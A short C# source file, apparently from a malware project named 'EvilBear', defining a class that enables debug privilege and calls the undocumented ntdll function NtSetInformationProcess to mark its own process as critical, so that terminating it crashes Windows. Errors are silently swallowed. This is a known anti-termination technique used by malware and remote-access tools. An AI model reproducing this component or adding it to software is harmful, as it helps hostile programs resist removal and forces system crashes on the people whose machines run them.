using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EvilBear;

public class CCritical
{
	public static void Enable()
	{
		try
		{
			Process.EnterDebugMode();
			AdjustCritical(1);
		}
		catch
		{
		}
	}

	private static void AdjustCritical(int enable)
	{
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref enable, 4);
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
}
